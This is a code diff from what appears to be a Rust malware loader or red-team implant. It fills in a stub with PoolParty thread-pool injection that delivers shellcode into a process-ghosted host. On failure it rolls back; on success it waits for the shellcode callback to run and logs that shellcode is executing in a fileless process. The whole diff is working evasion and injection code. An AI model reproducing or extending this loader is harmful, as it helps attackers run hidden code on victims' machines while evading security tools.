@@ -40,10 +40,30 @@ pub unsafe fn execute(config: ghosting::Config) -> bool { unsafe {
         return false;
     }
 
-    // TODO: PoolParty injection
-    true    
-}}
+    debug!("[*2] PoolParty: Injecting into ghosted host (PID {})", state.process_id);
+    let delivered = poolparty::migrate(
+        config.shellcode, 
+        state.process_handle, 
+        state.process_id
+    );
 
+    if !delivered {
+        debug!("[*2] PoolParty Failed, killing ghost");
+        state.rollback();
+        return false;
+    }
+    
+    // Give the thread pool worker 500ms to pick up teh complection packet and dispatch the shellcode callback before we return
+    let mut settle: i64 = -5000000; // 500ms
+    nt::nt_wait_for_single_object(
+        state.process_handle,
+        0u8,
+        &mut settle as *mut _ as *mut c_void,
+    );
+
+    debug!("[=] Pipeline complete: shellcode running in file less process (PID {})", state.process_id);
+    true
+}}
 
 
 /**
